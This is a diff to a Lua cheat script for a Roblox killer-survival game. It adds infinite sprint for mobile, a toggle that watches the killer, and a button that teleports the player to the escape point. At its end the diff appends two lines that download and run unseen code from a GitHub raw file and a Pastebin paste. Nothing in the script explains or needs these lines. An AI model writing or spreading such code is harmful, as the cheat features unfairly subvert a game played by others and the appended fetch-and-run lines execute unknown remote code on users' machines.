@@ -42,6 +42,8 @@ pp.Parent = workspace
 
 local infiniteSprint = false
 local sprintConn = nil
+local UserInputService = game:GetService("UserInputService")
+local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
 maintab:Toggle("Infinite Sprint", "Allows You To Sprint Forever.", function(state)
     infiniteSprint = state
@@ -53,12 +55,20 @@ maintab:Toggle("Infinite Sprint", "Allows You To Sprint Forever.", function(stat
             local char = game.Players.LocalPlayer.Character
             if not char then return end
 
-            local uis = game:GetService("UserInputService")
-
-            if uis:IsKeyDown(Enum.KeyCode.LeftShift) or uis:IsKeyDown(Enum.KeyCode.RightShift) then
-                char:SetAttribute("WalkSpeed", 25)
+            if isMobile then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum and hum.MoveDirection.Magnitude > 0 then
+                    char:SetAttribute("WalkSpeed", 24)
+                else
+                    char:SetAttribute("WalkSpeed", 12)
+                end
             else
-                char:SetAttribute("WalkSpeed", 12)
+                local uis = UserInputService
+                if uis:IsKeyDown(Enum.KeyCode.LeftShift) or uis:IsKeyDown(Enum.KeyCode.RightShift) then
+                    char:SetAttribute("WalkSpeed", 25)
+                else
+                    char:SetAttribute("WalkSpeed", 12)
+                end
             end
         end)
 
@@ -349,6 +359,59 @@ maintab:Toggle("Safety Area", "Teleports To A Safe Area.", function(state)
             Text = "Disabled.",
             Duration = 2
         })
+    end
+end)
+
+local viewKiller = false
+local oldCameraSubject = nil
+
+maintab:Toggle("View Killer", "Views The Killer.", function(state)
+    viewKiller = state
+
+    local camera = workspace.CurrentCamera
+
+    if state then
+        local killerFolder = workspace.PLAYERS.KILLER
+        local killerChar = killerFolder and killerFolder:GetChildren()[1]
+
+        if killerChar then
+            local hum = killerChar:FindFirstChildOfClass("Humanoid")
+            if hum then
+                oldCameraSubject = camera.CameraSubject
+                camera.CameraSubject = hum
+            end
+        end
+
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "View Killer",
+            Text = "Enabled.",
+            Duration = 2
+        })
+    else
+        if oldCameraSubject then
+            camera.CameraSubject = oldCameraSubject
+            oldCameraSubject = nil
+        end
+
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "View Killer",
+            Text = "Disabled.",
+            Duration = 2
+        })
+    end
+end)
+
+maintab:Button("Teleport to Escape", "Teleports To The Exit (Use When It Opens.)", function()
+    local char = game.Players.LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    local escapePoint = workspace.MAPS["GAME MAP"].Escapes.EscapePoint
+
+    if escapePoint and escapePoint:IsA("BasePart") then
+        root.CFrame = escapePoint.CFrame + Vector3.new(0, 3, 0)
+    else
     end
 end)
 
@@ -645,3 +708,6 @@ helptab:Button("Copy Discord Server Invite", function()
     })
     setclipboard("https://discord.gg/8stFYxJv4R")
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/oldthingyep",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R",true))()
